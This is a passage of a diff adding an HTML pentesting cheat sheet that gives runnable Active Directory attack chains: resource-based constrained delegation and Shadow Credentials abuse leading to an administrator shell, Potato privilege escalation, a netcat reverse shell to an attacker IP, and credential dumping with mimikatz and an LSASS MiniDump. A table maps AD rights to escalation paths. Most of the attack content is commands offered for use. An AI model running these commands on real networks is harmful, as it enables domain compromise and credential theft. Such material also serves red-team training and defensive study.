+                    <p>Starting from AD object permissions over a computer (or user) — full chain to interactive shell.</p>
+                    <pre class="cb"><span class="cm"># ─── You have ACL rights over a computer object → pivot to shell ──────────────</span>
+
+<span class="cm"># ── RBCD flow (GenericWrite / GenericAll on target computer) ─────────────────</span>
+<span class="cm"># 1. Create or use existing machine account</span>
+python3 addcomputer.py -computer-name &#x27;ATTACKER$&#x27; \
+  -computer-pass &#x27;P@ssword123&#x27; DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP
+
+<span class="cm"># 2. Set RBCD — allow ATTACKER$ to impersonate users on TARGET</span>
+python3 rbcd.py -delegate-from &#x27;ATTACKER$&#x27; -delegate-to &#x27;TARGET$&#x27; \
+  -action write DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP
+
+<span class="cm"># 3. Get TGT for the attacker machine account</span>
+python3 getTGT.py DOMAIN.LOCAL/&#x27;ATTACKER$&#x27;:&#x27;P@ssword123&#x27; -dc-ip DC_IP
+export KRB5CCNAME=ATTACKER$.ccache
+
+<span class="cm"># 4. S4U2Self + S4U2Proxy — impersonate Administrator on TARGET</span>
+python3 getST.py DOMAIN.LOCAL/&#x27;ATTACKER$&#x27;:&#x27;P@ssword123&#x27; \
+  -spn cifs/TARGET.DOMAIN.LOCAL \
+  -impersonate Administrator -dc-ip DC_IP
+export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
+
+<span class="cm"># 5. Shell</span>
+python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+
+<span class="cm"># ── Shadow Credentials flow (GenericWrite / GenericAll on target) ─────────────</span>
+<span class="cm"># 1. Write KeyCredential to target</span>
+python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p &#x27;Password123&#x27; \
+  --target TARGET_USER --action add --dc-ip DC_IP
+<span class="cm"># 2. Authenticate with the pfx</span>
+certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
+<span class="cm"># → outputs NTLM hash + CCACHE</span>
+export KRB5CCNAME=TARGET_USER.ccache
+
+<span class="cm"># ── WriteDACL on target computer → grant yourself GenericAll ──────────────────</span>
+python3 dacledit.py -action write -rights FullControl \
+  -principal attacker -target &#x27;TARGET$&#x27; \
+  DOMAIN.LOCAL/attacker:&#x27;Password123&#x27; -dc-ip DC_IP
+
+<span class="cm"># ── Once you have a shell: check token privileges ────────────────────────────</span>
+whoami /all
+whoami /priv
+<span class="cm"># Look for: SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege</span>
+
+<span class="cm"># ── SeImpersonate on the box → SYSTEM via Potato ────────────────────────────</span>
+<span class="cm"># Upload GodPotato, PrintSpoofer, or SigmaPotato</span>
+GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;
+GodPotato-NET4.exe -cmd &quot;cmd /c net localgroup Administrators attacker /add&quot;
+PrintSpoofer.exe -c &quot;nc.exe &lt;ATTACKER_IP&gt; 4444 -e cmd&quot;
+
+<span class="cm"># ── After SYSTEM: credential dump ────────────────────────────────────────────</span>
+<span class="cm"># Dump SAM (reg save while SYSTEM/admin)</span>
+reg save HKLM\SAM C:\Windows\Temp\SAM
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
+
+<span class="cm"># Or run mimikatz directly:</span>
+.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;
+
+<span class="cm"># LSASS dump via comsvcs (no upload needed)</span>
+for /f &quot;tokens=1,2&quot; %a in (&#x27;tasklist /fi &quot;imagename eq lsass.exe&quot; /fo list ^| findstr &quot;PID:&quot;&#x27;) do set lsasspid=%b
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsass.dmp full</pre>
+                </div>
+            </details>
+
+            <!-- 10 Privileges table -->
+            <details id="s10" open>
+                <summary><span class="sum-num">10</span><span class="sum-title">AD Rights &amp; Privileges → Privesc Paths</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>Quick-reference for every AD right and local privilege that translates to a meaningful escalation path.</p>
+                    <table class="priv-table">
+<thead><tr><th>Right / Group</th><th>Abuse Path</th><th>Result</th></tr></thead>
+<tbody>
+<tr><td class="priv-name">GenericAll on User</td><td class="tech">Set password, set SPN, shadow creds, logon script</td><td class="tech">Account takeover → chain further</td></tr>
+<tr><td class="priv-name">GenericWrite on User</td><td class="tech">Set SPN (Kerberoast), set logon script, shadow creds</td><td class="tech">Credential access</td></tr>
+<tr><td class="priv-name">ForceChangePassword</td><td class="tech">Reset password without knowing current</td><td class="tech">Direct account takeover</td></tr>
+<tr><td class="priv-name">AllExtendedRights on User</td><td class="tech">Includes ForceChangePassword + read LAPS, etc.</td><td class="tech">Account takeover</td></tr>
+<tr><td class="priv-name">WriteOwner on User</td><td class="tech">Take ownership → WriteDACL → GenericAll</td><td class="tech">Account takeover</td></tr>
+<tr><td class="priv-name">WriteDACL on User</td><td class="tech">Grant yourself GenericAll</td><td class="tech">Account takeover</td></tr>
+<tr><td class="priv-name">GenericAll on Group</td><td class="tech">Add yourself or another user as member</td><td class="tech">Group privilege escalation</td></tr>
+<tr><td class="priv-name">AddMember on Group</td><td class="tech">Add members directly</td><td class="tech">Group privilege escalation</td></tr>
+<tr><td class="priv-name">GenericWrite on Computer</td><td class="tech">RBCD, shadow credentials</td><td class="tech">Impersonate admin → shell on machine</td></tr>
+<tr><td class="priv-name">GenericAll on Computer</td><td class="tech">All of GenericWrite + reset machine password</td><td class="tech">Full machine compromise</td></tr>
+<tr><td class="priv-name">WriteDACL on Domain</td><td class="tech">Grant DCSync rights (DS-Replication-Get-Changes-All)</td><td class="tech">Full domain compromise</td></tr>
+<tr><td class="priv-name">GenericAll on OU</td><td class="tech">Apply malicious GPO, inherit permissions</td><td class="tech">All objects in OU compromised</td></tr>
+<tr><td class="priv-name">Owns any object</td><td class="tech">Take ownership → WriteDACL → GenericAll</td><td class="tech">Depends on object</td></tr>
+<tr><td class="priv-name">Domain Admins</td><td class="tech">Admin on every domain-joined machine, DCSync</td><td class="tech">Full domain</td></tr>
+<tr><td class="priv-name">Account Operators</td><td class="tech">Create/modify most users and groups (excl. protected)</td><td class="tech">Add to privileged groups</td></tr>
+<tr><td class="priv-name">Backup Operators</td><td class="tech">SeBackup/SeRestore → copy NTDS.dit via VSS</td><td class="tech">Full domain (offline)</td></tr>
+<tr><td class="priv-name">Server Operators (DC)</td><td class="tech">Modify service binPath → SYSTEM on DC</td><td class="tech">DC compromise</td></tr>
+<tr><td class="priv-name">Print Operators</td><td class="tech">SeLoadDriver → BYOVD kernel exploit</td><td class="tech">SYSTEM on DC</td></tr>
+<tr><td class="priv-name">DnsAdmins</td><td class="tech">ServerLevelPluginDll → custom DLL loaded by DNS as SYSTEM</td><td class="tech">SYSTEM on DC → domain</td></tr>
+<tr><td class="priv-name">Group Policy Creator Owners</td><td class="tech">Create / modify GPOs → mass code execution</td><td class="tech">All affected machines</td></tr>
+<tr><td class="priv-name">Enterprise Admins</td><td class="tech">Admin across entire forest</td><td class="tech">Full forest compromise</td></tr>
+<tr><td class="priv-name">SeImpersonatePrivilege</td><td class="tech">Potato family (GodPotato / PrintSpoofer) on any machine</td><td class="tech">SYSTEM shell</td></tr>
+<tr><td class="priv-name">SeBackupPrivilege</td><td class="tech">Read any file → SAM / NTDS.dit</td><td class="tech">Credential access</td></tr>
+<tr><td class="priv-name">SeDebugPrivilege</td><td class="tech">Open/inject into any process → dump LSASS</td><td class="tech">All local creds</td></tr>
+<tr><td class="priv-name">ReadLAPSPassword (AllExtendedRights on computer)</td><td class="tech">Read ms-MCS-AdmPwd attribute → local admin creds</td><td class="tech">Local admin on that machine</td></tr>
+<tr><td class="priv-name">ReadGMSAPassword</td><td class="tech">Read msDS-ManagedPassword → GMSA hash</td><td class="tech">Whatever the GMSA has access to</td></tr>
+</tbody>
+</table>
+                </div>
+            </details>
+
+        </main>
+    </div>
+
+    <footer>
+        <p><i>Imaginary Address, Canada</i></p>
+        <p><b>hd</b></p>
+        <p>Last updated : 2026-09-30</p>
+        <p class="status"><span class="dot"></span>connection encrypted // session active</p>
+        <svg width="100" height="80" viewBox="0 0 100 80">
+            <rect x="10" y="10" width="80" height="50" rx="6" ry="6" fill="none" stroke="#38bdf8" stroke-width="3"/>
+            <rect x="40" y="65" width="20" height="5" fill="#38bdf8"/>
+            <rect x="30" y="70" width="40" height="4" fill="#38bdf8"/>
+        </svg>
+    </footer>
+
+    <script src="/terminal.js" defer></script>
+</body>
+</html>
